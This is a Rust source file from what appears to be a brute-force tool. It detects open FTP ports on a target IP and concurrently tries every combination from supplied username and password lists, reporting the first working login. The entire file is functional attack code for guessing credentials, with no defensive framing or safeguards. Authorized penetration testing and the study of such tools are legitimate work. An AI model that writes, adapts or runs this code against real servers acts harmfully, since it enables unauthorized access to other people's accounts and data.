// src/ftp.rs

use anyhow::{Context, Result};
use futures::stream::{FuturesUnordered, StreamExt};
use suppaftp::FtpStream;
use std::{
    net::TcpStream,
    sync::Arc,
    time::Duration,
};
use tokio::task;
use crate::events::BruteEvent;

const FTP_PORTS: &[u16] = &[21, 2121, 2100];
const CONNECT_TIMEOUT_SECS: u64 = 5;
const RETRY_DELAY_MS: u64 = 200;
const MAX_RETRIES: usize = 2;

/// Brute-force FTP for a single IP, returning event logs
pub async fn bruteforce_ip(
    ip: String,
    usernames: Arc<Vec<String>>,
    passwords: Arc<Vec<String>>,
) -> Vec<BruteEvent>
 {
    let mut events = Vec::new();
    let mut open_port = None;

    // Port detection
    for &port in FTP_PORTS {
        if is_port_open(&ip, port).await {
            open_port = Some(port);
            events.push(BruteEvent::Info(format!("FTP port {} open on {}", port, ip)));
            break;
        }
    }

    let port = match open_port {
        Some(port) => port,
        None => {
            events.push(BruteEvent::Fail(format!("No open FTP port on {}", ip)));
            return events;
        }
    };

    let mut tasks = FuturesUnordered::new();

    for username in usernames.iter().cloned() {
        for password in passwords.iter().cloned() {
            let ip = ip.clone();
            let username = username.clone();
            let password = password.clone();

            tasks.push(task::spawn_blocking(move || {
                try_login(&ip, port, &username, &password)
            }));
        }
    }

    while let Some(result) = tasks.next().await {
        match result {
            Ok(Ok(success_string)) => {
                let parts: Vec<&str> = success_string.splitn(2, ':').collect();
                events.push(BruteEvent::Success {
                    protocol: "FTP".to_string(),
                    ip: ip.clone(),
                    username: parts[0].to_string(),
                    password: parts[1].to_string(),
                    port,
                });
                return events;
            }
            Ok(Err(e)) => events.push(BruteEvent::Error(e.to_string())),
            Err(e) => events.push(BruteEvent::Error(format!("Join error: {}", e))),
        }
    }

    events.push(BruteEvent::Fail(format!("FTP brute-force failed on {}", ip)));
    events
}

/// Checks if a port is open
async fn is_port_open(ip: &str, port: u16) -> bool {
    let ip = ip.to_string(); // clone it inside
    tokio::task::spawn_blocking(move || TcpStream::connect_timeout(
        &format!("{}:{}", ip, port).parse().unwrap(),
        Duration::from_secs(CONNECT_TIMEOUT_SECS),
    ))
    .await
    .map(|r| r.is_ok())
    .unwrap_or(false)
}


/// Tries FTP login
fn try_login(ip: &str, port: u16, user: &str, pass: &str) -> Result<String> {
    for attempt in 1..=MAX_RETRIES {
        match FtpStream::connect(format!("{}:{}", ip, port)) {
            Ok(mut ftp) => {
                ftp.login(user, pass)?;
                ftp.quit().ok();
                return Ok(format!("{}:{}", user, pass));
            }
            Err(e) => {
                if attempt < MAX_RETRIES {
                    std::thread::sleep(Duration::from_millis(RETRY_DELAY_MS));
                } else {
                    return Err(anyhow::anyhow!("FTP connect error: {}", e));
                }
            }
        }
    }
    Err(anyhow::anyhow!("Max retries reached for FTP"))
}

